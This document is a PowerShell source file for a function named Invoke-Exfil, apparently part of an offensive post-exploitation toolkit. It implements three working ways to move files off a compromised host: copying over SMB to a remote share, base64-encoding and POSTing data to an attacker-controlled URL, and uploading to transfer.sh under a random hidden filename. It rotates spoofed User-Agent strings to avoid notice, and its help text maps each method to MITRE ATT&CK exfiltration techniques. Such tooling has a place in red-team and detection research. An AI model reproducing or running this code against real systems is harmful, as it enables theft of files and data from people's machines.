function Invoke-Exfil {
<#
                                          
.SYNOPSIS
	Methods to allow for moving files off of a target system to a remote system.

.PARAMETER Help
	Shows detailed help for each function.

.PARAMETER List
	Shows summary list of available functions.
	
.PARAMETER SmbExfil
	Copies a local file over SMB to a remote SMB Server/Share.

.PARAMETER RestExfil
	Uses PowerShell's "Invoke-RestMethod" "POST" to Base64 encode and send a file to an attacker-controlled web server.

.PARAMETER TransferShExfil
	Uploads a file to the https://transfer.sh file upload service. A URL to the file will be returned and is valid for 14 days. "Invoke-WebRequest" and PUT is utilized for this function.
	
.EXAMPLE
	PS> Invoke-Exfil -SmbExfil -LocalFile C:\temp\data.txt -SmbIp n.n.n.n
	
.EXAMPLE
	Invoke-Exfil -RestExfil -LocalFile C:\file -Url https://srv/exfil
	
.EXAMPLE
	Invoke-Exfil -TransferShExfil -LocalFile C:\file
	
.NOTES
	Author: Fabrizio Siciliano (@0rbz_)

#>

[CmdletBinding()]
param (
	[Parameter(Position=1)]
	[Switch]$Help,
	[switch]$List,
	
	[Parameter(Mandatory = $False)]
	[Switch]$SmbExfil,
	[String]$SmbIp,
	[String]$LocalFile,
	
	[Parameter(Mandatory = $False)]
	[Switch]$RestExfil,
	[String]$LocalFile2=[String]$Localfile,
	[String]$Url,
	
	[Parameter(Mandatory = $False)]
	[Switch]$TransferShExfil,
	[String]$LocalFile3=[String]$LocalFIle
)

$UAArray = @(
	('Mozilla/4.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/11.0.1245.0 Safari/537.36'),
	('Mozilla/4.0 (Windows; U; Windows NT 5.0; en-US) AppleWebKit/532.0 (KHTML, like Gecko) Chrome/3.0.195.33 Safari/532.0'),
	('Mozilla/4.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.59 Safari/525.19'),
	('Mozilla/5.0 (Macintosh; AMD Mac OS X 10_8_2) AppleWebKit/535.22 (KHTML, like Gecko) Chrome/18.6.872'),
	('Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36'),
	('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 3.0.04506.30)'),
	('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; SLCC1; .NET CLR 1.1.4322)'),
	('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)'),
	('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)'),
	('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)'),
	('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; Media Center PC 4.0; SLCC1; .NET CLR 3.0.04320)'),
	('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.8.36217; WOW64; en-US)'),
	('Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; .NET CLR 2.7.58687; SLCC2; Media Center PC 5.0; Zune 3.4; Tablet PC 3.6; InfoPath.3)'),
	('Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_2; en-us) AppleWebKit/525.7 (KHTML, like Gecko) Version/3.1 Safari/525.7'),
	('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.0'),
	('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; de) Opera 8.02'),
	('Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; en) Opera 8.0')
)

$UA = ($UAArray[(get-random -Maximum ([array]$UAArray).count)])

	if ($Help -eq $True) {
		Write @"
		
 ### Invoke-Exfil Help ###
 -------------------------
 Available Invoke-Exfil Commands:
 --------------------------------
 |-----------------------------------------------------------------------------|
 | -SmbExfil [-LocalFile] local_file [-SmbIp] smb_ip                           |
 |-----------------------------------------------------------------------------|

   [*] Description: Copies a local file over SMB to a remote SMB Server/Share.

   [*] Usage: Invoke-Exfil -SmbExfil -LocalFile C:\temp\data.txt -SmbIp n.n.n.n
	   
   [*] Mitre ATT&CK Ref: T1020 (Automated Exfiltration)
   [*] Mitre ATT&CK Ref: T1048 (Exfiltration over Alternative Protocol)   
 
 |-----------------------------------------------------------------------------|
 | -RestExfil [-LocalFile] local_file [-Url] remote_server                     |
 |-----------------------------------------------------------------------------|
 
   [*] Description: Uses PowerShell's "Invoke-RestMethod" "POST" to Base64 encode 
       and send a file to an attacker-controlled web server.
	
   [*] Usage: Invoke-Exfil -RestExfil -LocalFile C:\file -Url https://srv/exfil
   
   [*] Mitre ATT&CK Ref: T1020 (Automated Exfiltration)
   [*] Mitre ATT&CK Ref: T1048 (Exfiltration over Alternative Protocol)
   
 |-----------------------------------------------------------------------------|
 | -TransferShExfil [-LocalFile] local_file                                    |
 |-----------------------------------------------------------------------------|
 
   [*] Description: Uploads a file to the https://transfer.sh file upload 
       service. A URL to the file will be returned and is valid for 14 days. 
       "Invoke-WebRequest" and PUT is utilized for this function.
	
   [*] Usage: Invoke-Exfil -TransferShExfil -LocalFile C:\file
   
   [*] Mitre ATT&CK Ref: T1020 (Automated Exfiltration)
   [*] Mitre ATT&CK Ref: T1048 (Exfiltration over Alternative Protocol)
	   
 |-----------------------------------------------------------------------------|

"@
	}
	elseif ($List -eq $True) {
		Write @"  

 Invoke-Exfil Command List:
 --------------------------
 Invoke-Exfil -SmbExfil [-LocalFile] local_file [-SmbIp] smb_ip
 Invoke-Exfil -RestExfil [-LocalFile] local_file [-Url] remote_server
 Invoke-Exfil -TransferShExfil [-LocalFile] local_file

"@
	}

	elseif ($SmbExfil -and $SmbIp -and $LocalFile) {
	
		(Copy-Item -Path $LocalFile -Destination \\$SmbIp\data\)
	
	}
	elseif ($RestExfil -and $LocalFile -and $Url) {
	
		if ($PSVersionTable.PSVersion.Major -eq "2") {
			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
			return
		}
		else {
			$Data = Get-Content $LocalFile
			$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Data)
			$EncodedData = [Convert]::ToBase64String($Bytes)
			
			$Headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
			$Headers.Add("USER-AGENT", $UA)
			
			$Request = Invoke-RestMethod $Url -Method Post -Body $EncodedData -Headers $Headers
		}
	}
	elseif ($TransferShExfil -and $LocalFIle) {
	
		if ($PSVersionTable.PSVersion.Major -eq "2") {
			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
			return
		}
		else {
			$FileName = '.'+(-join ((65..90) + (97..122) | Get-Random -Count 32 | foreach {[char]$_}))
				
			$Headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
			$Headers.Add("USER-AGENT", $UA)
			
			$Request = (Invoke-WebRequest -Method Put -infile $LocalFile -Headers $Headers https://transfer.sh/$FileName)
			
			Write " `n[+] Link to file; valid for 14 days --> $Request `n"
		}
	}
}
